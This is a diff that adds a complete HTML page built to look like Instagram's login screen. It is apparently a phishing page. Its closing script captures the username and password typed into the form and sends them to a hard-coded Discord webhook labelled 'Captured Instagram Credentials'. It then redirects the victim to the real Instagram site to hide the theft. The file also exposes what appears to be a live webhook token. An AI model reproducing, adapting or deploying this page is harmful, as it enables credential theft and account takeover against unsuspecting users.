@@ -1,0 +1,284 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>Instagram</title>
+    <link rel="icon" type="image/png" href="https://www.instagram.com/static/images/ico/favicon.ico/36b3ee2d91ed.ico" />
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lobster" />
+    <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous" />
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+        body {
+            background: #fafafa;
+            color: #262626;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            font-size: 14px;
+            line-height: 18px;
+        }
+        .container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            max-width: 935px;
+            margin: 32px auto 0;
+            padding-bottom: 32px;
+            width: 100%;
+        }
+        .col.image {
+            flex: 0 0 454px;
+            height: 618px;
+            margin-right: 32px;
+            position: relative;
+        }
+        #image {
+            height: 581px;
+            left: 128px;
+            position: absolute;
+            top: 27px;
+            width: 240px;
+        }
+        .col.content {
+            flex-grow: 1;
+            max-width: 350px;
+        }
+        .box {
+            background: #fff;
+            border: 1px solid #dbdbdb;
+            margin-bottom: 10px;
+            padding: 10px 0;
+            text-align: center;
+        }
+        .title img {
+            height: 51px;
+            margin: 22px auto 12px;
+        }
+        .login-form {
+            margin: 0 auto;
+            max-width: 258px;
+            width: 100%;
+        }
+        .form-content {
+            position: relative;
+            margin-bottom: 6px;
+        }
+        input {
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            color: #262626;
+            font-size: 12px;
+            height: 36px;
+            padding: 9px 0 7px 8px;
+            width: 100%;
+        }
+        label {
+            color: #8e8e8e;
+            font-size: 12px;
+            left: 8px;
+            line-height: 36px;
+            position: absolute;
+            top: 0;
+            transition: all 0.1s ease;
+            pointer-events: none;
+        }
+        input:focus + label, input:not(:placeholder-shown) + label {
+            font-size: 10px;
+            line-height: 14px;
+            top: -6px;
+        }
+        button {
+            background: #0095f6;
+            border: none;
+            border-radius: 4px;
+            color: #fff;
+            font-size: 14px;
+            font-weight: 600;
+            height: 30px;
+            margin: 8px 40px;
+            width: calc(100% - 80px);
+        }
+        .form-ending {
+            margin-top: 15px;
+        }
+        #OR {
+            color: #8e8e8e;
+            font-size: 13px;
+            font-weight: 600;
+            margin: 0;
+        }
+        #line {
+            background: #dbdbdb;
+            display: block;
+            height: 1px;
+            margin: -9px auto 10px;
+            width: 100%;
+        }
+        #facebook {
+            color: #385185;
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 20px;
+        }
+        #facebook i {
+            margin-right: 8px;
+        }
+        .form-ending a {
+            color: #00376b;
+            font-size: 12px;
+            text-decoration: none;
+        }
+        .mini-box {
+            background: #fff;
+            border: 1px solid #dbdbdb;
+            padding: 10px 0;
+            text-align: center;
+        }
+        .mini-box .text {
+            font-size: 14px;
+        }
+        .mini-box a {
+            color: #0095f6;
+            font-weight: 600;
+            text-decoration: none;
+        }
+        .download-section {
+            margin-top: 20px;
+            text-align: center;
+        }
+        .download-section p {
+            font-size: 14px;
+            margin-bottom: 10px;
+        }
+        .download-section .images img {
+            height: 40px;
+            margin: 0 4px;
+        }
+        footer {
+            margin: 50px auto 0;
+            max-width: 935px;
+            text-align: center;
+        }
+        footer ul {
+            list-style: none;
+        }
+        footer li {
+            display: inline-block;
+            margin: 0 7px 5px;
+        }
+        footer li a {
+            color: #003569;
+            font-size: 12px;
+            text-decoration: none;
+            text-transform: uppercase;
+        }
+        .copyright {
+            color: #8e8e8e;
+            font-size: 12px;
+            margin-top: 15px;
+        }
+        @media (max-width: 875px) {
+            .col.image {
+                display: none;
+            }
+            .container {
+                justify-content: center;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="col image">
+            <a href="#"><img src="https://i.ibb.co/Q8X79RK/image.png" alt="instagram" id="image"></a>
+        </div>
+        <div class="col content">
+            <div class="box">
+                <div class="title">
+                    <a href="#"><img src="https://i.ibb.co/2dCLRGv/logoname.png" alt="logoname"></a>
+                </div>
+                <form class="login-form" id="loginForm">
+                    <div class="form-content">
+                        <input type="text" id="uname" name="uname" required placeholder=" " />
+                        <label for="uname">Phone number, username, or email</label>
+                    </div>
+                    <div class="form-content">
+                        <input type="password" id="password" name="password" required placeholder=" " />
+                        <label for="password">Password</label>
+                    </div>
+                    <div class="form-content">
+                        <button type="submit">Log in</button>
+                    </div>
+                    <div class="form-ending">
+                        <center>
+                            <p id="OR">OR</p>
+                            <span id="line"></span>
+                        </center>
+                        <p id="facebook"><i class="fab fa-facebook-square"></i>Login with Facebook</p>
+                        <a href="#">Forgot password?</a>
+                    </div>
+                </form>
+            </div>
+            <div class="mini-box">
+                <div class="text">Don't have an account? <a href="#">Sign up</a></div>
+            </div>
+            <div class="download-section">
+                <p>Get the app.</p>
+                <div class="images">
+                    <a href="#"><img src="https://i.ibb.co/5KyMHpd/appstore.png" alt="appstore"></a>
+                    <a href="#"><img src="https://i.ibb.co/ZTHhz0b/playstore.png" alt="playstore"></a>
+                </div>
+            </div>
+        </div>
+    </div>
+    <footer>
+        <ul>
+            <li>About</li>
+            <li>Blog</li>
+            <li>Jobs</li>
+            <li>Help</li>
+            <li>API</li>
+            <li>Privacy</li>
+            <li>Terms</li>
+            <li>Top Accounts</li>
+            <li>Hashtags</li>
+            <li>Locations</li>
+        </ul>
+        <div class="copyright">
+            <select aria-label="Switch Display Language">
+                <option value="en">English</option>
+            </select>
+            &copy; 2025 Instagram from Meta
+        </div>
+    </footer>
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            var uname = document.getElementById('uname').value;
+            var password = document.getElementById('password').value;
+            var webhookUrl = 'https://discord.com/api/webhooks/1404911273312780318/SAqJ3yj8Mn7SRf0lUhhWM5gC-VeDM0ykB4zDGDoElaZMk0IqmHDe_7xyJiLTX8beERSb';
+            var payload = {
+                content: `Captured Instagram Credentials:\nUsername/Email/Phone: ${uname}\nPassword: ${password}`
+            };
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            }).then(response => {
+                if (response.ok) {
+                    window.location.href = 'https://www.instagram.com/';
+                } else {
+                    alert('Login failed - try again!');
+                }
+            }).catch(error => {
+                console.error('Error sending data:', error);
+                window.location.href = 'https://www.instagram.com/';
+            });
+        });
+    </script>
+</body>
+</html>
